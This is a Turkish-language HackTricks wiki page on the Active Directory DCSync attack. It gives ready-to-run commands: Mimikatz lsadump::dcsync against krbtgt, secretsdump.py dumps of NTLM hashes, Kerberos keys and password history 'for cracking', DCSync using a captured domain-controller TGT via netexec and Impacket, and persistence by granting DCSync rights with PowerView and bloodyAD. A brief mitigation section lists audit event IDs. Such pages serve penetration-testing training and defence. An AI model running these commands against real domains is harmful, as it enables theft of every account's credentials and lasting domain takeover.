# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** iznine sahip olmak, domain'in kendisi üzerinde şu izinlere sahip olunduğu anlamına gelir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync hakkında önemli notlar:**

- **DCSync saldırısı, bir Domain Controller'ın davranışını taklit eder ve Directory Replication Service Remote Protocol (MS-DRSR) kullanarak diğer Domain Controller'lardan bilgileri replike etmelerini ister.** MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan kapatılamaz veya devre dışı bırakılamaz.
- Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
- Uygulamada, **tam DCSync** için domain naming context üzerinde **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** gerekir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bu izinlerle birlikte devredilir; ancak tek başına, tam bir krbtgt dökümünden ziyade **gizli / RODC tarafından filtrelenen özniteliklerin** (örneğin eski LAPS tarzı sırların) senkronizasyonuyla daha çok ilgilidir.<sup>[[2]](#references)</sup>
- Herhangi bir hesap parolası geri döndürülebilir şifreleme kullanılarak saklanıyorsa, Mimikatz'de parolayı açık metin olarak döndüren bir seçenek bulunur.

### Enumeration

`powerview` kullanarak bu izinlere kimlerin sahip olduğunu kontrol edin:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

DCSync haklarına sahip **varsayılan olmayan principal'lara** odaklanmak istiyorsanız, yerleşik replikasyon yeteneğine sahip grupları filtreleyin ve yalnızca beklenmeyen trustee'leri inceleyin:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Yerelde Exploit

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Uzaktan Exploit

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Pratik kapsamı sınırlandırılmış örnekler:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### Yakalanmış bir DC makine TGT'si (ccache) kullanarak DCSync

Bir etki alanı denetleyicisindeki hizmeti incelerken, yerel hizmet kimliğini ağ kimliğinden ayırt edin. [Microsoft'un belgelerinde](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) SQL Server sanal hesaplarının (`NT SERVICE\...`) ağ kaynaklarına ana bilgisayarın bilgisayar hesabı olarak eriştiği belirtilir. Bir etki alanı denetleyicisinde bu durum, DC makine hesabını çoğaltma haklarının incelenmesi açısından önemli kılabilir; ancak yalnızca bir hizmette foothold elde etmek, dışa aktarılabilir bir makine TGT'sinin veya kullanılabilir DCSync kimlik doğrulamasının varlığını kanıtlamaz. Bunu bir saldırı yolu olarak değerlendirmeden önce gerçek hizmet kimliğini, giden kimlik doğrulama bağlamını, kullanılabilir bilet veya kimlik bilgilerini ve etkin çoğaltma haklarını doğrulayın.

Unconstrained-delegation export-mode senaryolarında bir Domain Controller makine TGT'sini (ör. `krbtgt@DOMAIN` için `DC1$@DOMAIN`) yakalayabilirsiniz. Ardından bu ccache'i kullanarak DC olarak kimlik doğrulaması yapabilir ve parola olmadan DCSync gerçekleştirebilirsiniz.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operational notes:

- **Impacket's Kerberos path önce SMB'ye dokunur**, ardından DRSUAPI çağrısını yapar. Ortamda **SPN target name validation** uygulanıyorsa, tam döküm başarısız olabilir: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Bu durumda, önce hedef DC için bir **`cifs/<dc>`** service ticket isteyin veya hemen ihtiyaç duyduğunuz hesap için **`-just-dc-user`** seçeneğine geçin.
- Yalnızca daha düşük replication haklarına sahip olduğunuzda, LDAP/DirSync tarzı senkronizasyon, tam bir krbtgt replication işlemi olmadan **confidential** veya **RODC-filtered** öznitelikleri (örneğin eski `ms-Mcs-AdmPwd`) açığa çıkarabilir.<sup>[[2]](#references)</sup>

`-just-dc` 3 dosya oluşturur:

- **NTLM hash'lerini** içeren bir dosya
- **Kerberos key'lerini** içeren bir dosya
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmiş hesaplar için NTDS'den alınan cleartext parolaları içeren bir dosya. Reversible encryption etkin olan kullanıcıları şu komutla bulabilirsiniz:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Bir domain admin iseniz, bu izinleri PowerView yardımıyla herhangi bir kullanıcıya verebilirsiniz:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux operatörleri de `bloodyAD` ile aynısını yapabilir:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Ardından, (ayrıcalık adlarını "ObjectType" alanında görebilmeniz gerekir) çıktısında bunları arayarak kullanıcıya 3 ayrıcalığın doğru atanıp atanmadığını **kontrol edebilirsiniz**:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Azaltma

- Security Event ID 4662 (nesne için Audit Policy etkinleştirilmelidir) – Bir nesne üzerinde işlem gerçekleştirildi<sup>[[4]](#references)</sup>
- Security Event ID 5136 (nesne için Audit Policy etkinleştirilmelidir) – Bir directory service nesnesi değiştirildi
- Security Event ID 4670 (nesne için Audit Policy etkinleştirilmelidir) – Bir nesnenin izinleri değiştirildi
- AD ACL Scanner - ACL raporları oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket Değişiklik Günlüğü](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes ve Get-Changes-In-Filtered-Set'ten Yararlanma](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller'dan Password Hash'lerini Dökme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL kimlik bilgileri → Targeted Kerberoast → Unconstrained Delegation → DA'ya DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
